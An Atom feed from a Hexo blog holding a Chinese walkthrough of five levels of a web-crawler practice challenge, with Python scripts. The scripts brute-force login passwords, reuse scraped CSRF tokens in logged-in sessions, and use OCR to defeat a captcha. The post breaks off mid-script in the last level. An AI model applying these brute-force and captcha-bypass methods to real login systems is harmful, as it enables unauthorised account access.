<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2018-07-26T14:40:26.906Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>黑板客爬虫闯关(1-5)</title>
    <link href="https://Foxgrin.github.io//posts/18564/"/>
    <id>https://Foxgrin.github.io//posts/18564/</id>
    <published>2018-07-26T08:34:00.000Z</published>
    <updated>2018-07-26T14:40:26.906Z</updated>
    
    <content type="html"><![CDATA[<p>昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码<a id="more"></a></p><h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass-1"></a>Pass-1</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/</a></p><p>首先页面给的提示是要我们在网址后面输入数字73618</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://www.heibanke.com/lesson/crawler_ex00/73618/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/73618/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>页面又提示要输入数字53825</p><p>访问<a href="http://www.heibanke.com/lesson/crawler_ex00/53825/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/53825/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>又提示要输入数字，于是推测这关要一直输入到某个数字后才能得到最后结果</p><p>那么我们可以将每个提示页面的数字，即下一个要输入的数字爬取下来，与原来的url构成一个下一个要访问的url，再继续爬取数字，假如爬取不到数字，就猜测可能得到了最后的结果</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex00/'</span></span><br><span class="line">num = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    next_url = url+num</span><br><span class="line">    print(next_url)</span><br><span class="line">    r = requests.get(next_url)</span><br><span class="line">    match = re.search(<span class="string">r'数字.*(\d&#123;5&#125;)'</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">        print(<span class="string">'You have found the last number!'</span>)</span><br><span class="line">        print(<span class="string">'The last number is:'</span>,str(num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    num = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里通过正则匹配出下一个要输入的数字，然后与网页原本的url拼成下一个要访问的url，当匹配不到数字时退出循环</p><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测69428是最后输入的数字，我们访问一下<a href="http://www.heibanke.com/lesson/crawler_ex00/69428/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/69428/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，页面提示了通关，点击下一关按钮，进入到第二关的页面</p><h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass-2"></a>Pass-2</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex01/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex01/</a></p><p>首先根据页面提示，我们需要在表单中输入一个用户名和密码，用户名可以随机输入，密码则是1到30之间的数字</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们先来看一下源代码中的表单部分</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出表单是以POST形式提交的，提交的参数为username和password，还会提交一个隐藏的token值，看到token值，我们的第一反应都是要先获取到页面的token值，与数据一起提交，但是经过测试，这关后台服务器并没有对token值进行检测，也就是说我们在程序中并不需要提交这个token值，也可以提交成功，既然不用管token，那么这关就很简单了</p><p>我们先随意提交一个用户名aaa和密码1看看提示是什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到页面提示”您输入的密码错误”，说明这是输入错误的提示信息，那么思路就很清晰了，我们依次提交数值为1-30之间的密码值，然后根据页面的提示信息是否包含”您输入的密码错误”，如果没有则可能是正确的密码</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex01/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">        <span class="string">'password'</span>:i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'提交'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'Correct password:'</span>,str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Wrong password:'</span>,str(i))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明20可能是正确的密码，我们在浏览器中提交</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>闯关成功，继续点击下一关按钮进入第三关</p><h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass-3"></a>Pass-3</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex02/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex02/</a></p><p>我们会发现自动跳转到了登录页面，也就是说这一关需要模拟登录</p><p>我们先注册一个账号和密码登录进去</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看起来和上一关没什么区别，一样是输入用户名和密码，用户名是随意的，密码还是1-30之间的数字，唯一区别在于页面提示比上一关多了两层保护，光看这句话还是很懵逼的，没事，我们看一看页面源代码，就可以大致猜到到底是什么保护了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出表单提交了隐藏的token值，猜测这关服务器会对token值进行检测</p><p>再回到登录页面，查看源代码的表单部分</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录页面也有一个token值</p><p>所以思路是这样的，我们首先需要模拟登录，这就需要用到requests库的Session方法保持一个会话记录，否则我们再次访问这关的页面依旧会跳转到登录页面，然后我们还需要爬取页面信息的token值，也就是提交token的input标签的value值</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex02/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex02/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(url=login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>, <span class="comment">#替换成自己的用户名</span></span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span>  <span class="comment">#替换成自己的密码</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第三关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully!'</span>)</span><br><span class="line">    pass_token = getToken(login.text)</span><br><span class="line">    <span class="keyword">return</span> pass_token</span><br><span class="line">    </span><br><span class="line">pass_token = login()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:pass_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">        <span class="string">'password'</span>:i</span><br><span class="line">        &#125;</span><br><span class="line">    result = s.post(url=pass_url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">'------Correct password:'</span>,str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'fail to pass'</span>)</span><br></pre></td></tr></table></figure><p>这里用了BeautifulSoup库的find_all方法获得所有input标签组成的列表，观察出token值所在的input标签是列表的第一个元素，就可以通过索引获得token值，登录成功后还要继续抓取关卡页面的token值，与用户名和密码一起提交</p><p>最后的运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器中提交用户名：aaa，密码：4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>闯关成功，此处后台代码有误，点击下一关还是第三关的页面，但是我们可以根据前面几关的url推测出第四关的url：<a href="http://www.heibanke.com/lesson/crawler_ex03/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex03/</a></p><h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass-4"></a>Pass-4</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex03/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex03/</a></p><p>跟第三关一样，还是需要先登录</p><p>登录后来到第四关关卡页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>页面提示”密码很长，是试不出来的，需要找出来”，看一下源代码，还是跟第二关第三关一样，提交username和password参数，服务器有对token值进行检测</p><p>但是还是没有关于密码的提示部分信息</p><p>怎么办呢，我们先试一下随便输入一个密码1，看看页面返回什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>惊喜的发现提示来了，我们点击”在这里耐心找”访问到提示页面(PS：这个页面有点慢，需要耐心等待加载)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>仔细观察，会发现这里提示信息是给出了一共100位的密码，其中每一位的值，而且每一页显示的位数还会变化，所以这里要访问所有的页数获取每一位数和对应的值是行不通的，所以我们干脆就一直访问第一页，爬取每一位的位数和对应的值，直到爬取位数共有100为止</p><p>直接附上代码吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex03/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex03/'</span></span><br><span class="line">hint_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex03/pw_list/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第四关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully'</span>)</span><br><span class="line">    pass_token = getToken(login.text)</span><br><span class="line">    <span class="keyword">return</span> pass_token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDict</span><span class="params">()</span>:</span></span><br><span class="line">    total_pos = []</span><br><span class="line">    passwordDict = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        hint = s.get(url=hint_url)</span><br><span class="line">        pos = re.findall(<span class="string">r'title="password_pos"&gt;(\d*)'</span>,hint.text)</span><br><span class="line">        value = re.findall(<span class="string">r'title="password_val"&gt;(\d*)'</span>,hint.text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pos)):</span><br><span class="line">            <span class="keyword">if</span> pos[i] <span class="keyword">not</span> <span class="keyword">in</span> total_pos:</span><br><span class="line">                total_pos.append(pos[i])</span><br><span class="line">                passwordDict[pos[i]] = value[i]</span><br><span class="line">        <span class="keyword">if</span> len(total_pos) == <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(len(total_pos))</span><br><span class="line">            print(passwordDict)</span><br><span class="line">    <span class="keyword">return</span> passwordDict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">(dic)</span>:</span></span><br><span class="line">    passList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        passList.append(dic[str(i)])</span><br><span class="line">    password = <span class="string">''</span>.join(passList)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">pass_token = login()</span><br><span class="line">passwordDict = getDict()</span><br><span class="line">print(passwordDict)</span><br><span class="line">password = getPassword(passwordDict)</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>一开始还是跟第三关一样，先获取登录页面的token值，然后登录，页面如果有返回”这里是黑板客爬虫闯关的第四关”的信息说明登录成功，登录成功再获取关卡页面的token值，接下来就获取位置数和对应的值，这里定义了一个列表total_pos用来存放总的位置数和一个字典 passwordDict用来存放位置数及其对应的值，然后不断的访问提示页面的第一页，通过re模块的findall方法匹配出pos和value列表，每次匹配完检查pos列表的每一个元素，如果不在total_pos中，则添加进total_pos中，并将‘pos[i]’:’value[i]’键值对添加进字典中，直到匹配出100位为止，此时就获得了每一位和对应的值，再从第一位开始从字典中取出value值，添加进passList列表中，最后将passList列表元素拼成一个长字符串，就是最后获得的密码</p><p>这里过程实在是很慢，总之看脸…脸好很快就爬到了100位</p><p>最后获得的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwordDict = &#123;</span><br><span class="line">    <span class="string">'73'</span>: <span class="string">'8'</span>, <span class="string">'76'</span>: <span class="string">'6'</span>, <span class="string">'28'</span>: <span class="string">'5'</span>, <span class="string">'72'</span>: <span class="string">'1'</span>, <span class="string">'61'</span>: <span class="string">'4'</span>, <span class="string">'32'</span>: <span class="string">'3'</span>, <span class="string">'57'</span>: <span class="string">'6'</span>, <span class="string">'75'</span>: <span class="string">'3'</span>, <span class="string">'90'</span>: <span class="string">'0'</span>, <span class="string">'53'</span>: <span class="string">'7'</span>, <span class="string">'74'</span>: <span class="string">'1'</span>, <span class="string">'56'</span>: <span class="string">'2'</span>, <span class="string">'83'</span>: <span class="string">'1'</span>, <span class="string">'34'</span>: <span class="string">'9'</span>, <span class="string">'44'</span>: <span class="string">'4'</span>, <span class="string">'70'</span>: <span class="string">'6'</span>, <span class="string">'92'</span>: <span class="string">'4'</span>, <span class="string">'18'</span>: <span class="string">'5'</span>, <span class="string">'93'</span>: <span class="string">'8'</span>, <span class="string">'37'</span>: <span class="string">'8'</span>, <span class="string">'85'</span>: <span class="string">'3'</span>, <span class="string">'67'</span>: <span class="string">'8'</span>, <span class="string">'17'</span>: <span class="string">'3'</span>, <span class="string">'62'</span>: <span class="string">'3'</span>, <span class="string">'84'</span>: <span class="string">'6'</span>, <span class="string">'24'</span>: <span class="string">'5'</span>, <span class="string">'8'</span>: <span class="string">'8'</span>, <span class="string">'15'</span>: <span class="string">'3'</span>, <span class="string">'100'</span>: <span class="string">'2'</span>, <span class="string">'55'</span>: <span class="string">'3'</span>, <span class="string">'1'</span>: <span class="string">'3'</span>, <span class="string">'10'</span>: <span class="string">'7'</span>, <span class="string">'20'</span>: <span class="string">'7'</span>, <span class="string">'79'</span>: <span class="string">'3'</span>, <span class="string">'12'</span>: <span class="string">'4'</span>, <span class="string">'91'</span>: <span class="string">'6'</span>, <span class="string">'36'</span>: <span class="string">'4'</span>, <span class="string">'43'</span>: <span class="string">'6'</span>, <span class="string">'60'</span>: <span class="string">'8'</span>, <span class="string">'48'</span>: <span class="string">'0'</span>, <span class="string">'25'</span>: <span class="string">'0'</span>, <span class="string">'22'</span>: <span class="string">'8'</span>, <span class="string">'4'</span>: <span class="string">'1'</span>, <span class="string">'16'</span>: <span class="string">'5'</span>, <span class="string">'94'</span>: <span class="string">'9'</span>, <span class="string">'54'</span>: <span class="string">'4'</span>, <span class="string">'50'</span>: <span class="string">'9'</span>, <span class="string">'66'</span>: <span class="string">'4'</span>, <span class="string">'64'</span>: <span class="string">'1'</span>, <span class="string">'5'</span>: <span class="string">'8'</span>, <span class="string">'47'</span>: <span class="string">'9'</span>, <span class="string">'51'</span>: <span class="string">'4'</span>, <span class="string">'80'</span>: <span class="string">'4'</span>, <span class="string">'69'</span>: <span class="string">'7'</span>, <span class="string">'71'</span>: <span class="string">'6'</span>, <span class="string">'7'</span>: <span class="string">'0'</span>, <span class="string">'96'</span>: <span class="string">'3'</span>, <span class="string">'46'</span>: <span class="string">'9'</span>, <span class="string">'2'</span>: <span class="string">'3'</span>, <span class="string">'27'</span>: <span class="string">'9'</span>, <span class="string">'49'</span>: <span class="string">'3'</span>, <span class="string">'13'</span>: <span class="string">'5'</span>, <span class="string">'99'</span>: <span class="string">'0'</span>, <span class="string">'89'</span>: <span class="string">'7'</span>, <span class="string">'39'</span>: <span class="string">'4'</span>, <span class="string">'26'</span>: <span class="string">'6'</span>, <span class="string">'63'</span>: <span class="string">'7'</span>, <span class="string">'29'</span>: <span class="string">'2'</span>, <span class="string">'52'</span>: <span class="string">'8'</span>, <span class="string">'65'</span>: <span class="string">'3'</span>, <span class="string">'33'</span>: <span class="string">'2'</span>, <span class="string">'30'</span>: <span class="string">'4'</span>, <span class="string">'9'</span>: <span class="string">'6'</span>, <span class="string">'86'</span>: <span class="string">'2'</span>, <span class="string">'19'</span>: <span class="string">'7'</span>, <span class="string">'38'</span>: <span class="string">'9'</span>, <span class="string">'40'</span>: <span class="string">'6'</span>, <span class="string">'98'</span>: <span class="string">'7'</span>, <span class="string">'77'</span>: <span class="string">'9'</span>, <span class="string">'59'</span>: <span class="string">'4'</span>, <span class="string">'41'</span>: <span class="string">'1'</span>, <span class="string">'42'</span>: <span class="string">'3'</span>, <span class="string">'21'</span>: <span class="string">'4'</span>, <span class="string">'45'</span>: <span class="string">'7'</span>, <span class="string">'58'</span>: <span class="string">'0'</span>, <span class="string">'6'</span>: <span class="string">'3'</span>, <span class="string">'81'</span>: <span class="string">'4'</span>, <span class="string">'23'</span>: <span class="string">'9'</span>, <span class="string">'3'</span>: <span class="string">'8'</span>, <span class="string">'11'</span>: <span class="string">'4'</span>, <span class="string">'97'</span>: <span class="string">'6'</span>, <span class="string">'82'</span>: <span class="string">'9'</span>, <span class="string">'14'</span>: <span class="string">'1'</span>, <span class="string">'87'</span>: <span class="string">'6'</span>, <span class="string">'78'</span>: <span class="string">'6'</span>, <span class="string">'31'</span>: <span class="string">'4'</span>, <span class="string">'95'</span>: <span class="string">'9'</span>, <span class="string">'68'</span>: <span class="string">'7'</span>, <span class="string">'88'</span>: <span class="string">'4'</span>, <span class="string">'35'</span>: <span class="string">'5'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>整理后的密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="number">3381830867445135357748950695244329548946136479903948743260484371348776618136963449163264706489936702</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第五关的url依旧要靠猜</p><h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass-5"></a>Pass-5</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex04/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex04/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>依然要登录，很明显这关要提交验证码，观察一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以发现这个验证码其实是一个url，点击进去能看到验证码的图片，跟token一样，每次刷新页面，验证码的url都会变化，因此验证码就会一直变化</p><p>所以，我们要通这最后一关，就必须要想办法获取这个验证码的值</p><p>在Python中，有一个库叫pytesseract，这个库里的image_to_string方法具有识别图片中信息的功能</p><p>由于这个库跟requests一样，是第三方库，因此我们需要先安装后才能使用</p><p>除了pytesseract库之外，我们还依赖PIL库的Image方法打开一个图片</p><p>安装这两个库都可以用pip命令安装</p><p>比较关键的是pytesseract库识别验证码还依赖于一个插件Tesseract-OCR ，这个插件我们可以百度搜索tesseract-ocr-setup-3.02.02.exe 下载，这里我使用的是3.02版本，没有碰到什么问题，按照安装提示一步步下载下来，唯一要注意的是要按照默认路径下载，Windows的默认安装路径是C:\Program Files (x86)\Tesseract-OCR\ </p><p>这是因为我们下载完后需要在Python文件夹的下的\Lib\site-packages\pytesseract\pytesseract.py修改源代码中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = <span class="string">'tesseract'</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = <span class="string">r'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'</span></span><br></pre></td></tr></table></figure><p>安装完成后，我们就可以获取验证码了，除了验证码外，我们还要获取三个值：登录界面的token值，关卡界面的token值，关卡界面的captcha_1 值</p><p>需要注意的是，我们用pytesseract库虽然可以识别验证码，但并不是百分百正确，所以我们需要对验证码进行校验，经过观察本关的验证码都是四个大小写英文字母，我们可以通过正则匹配进行校验，如果校验失败，则继续识别，直到校验成功，则提交猜测的密码，这里密码从0开始递增猜测</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 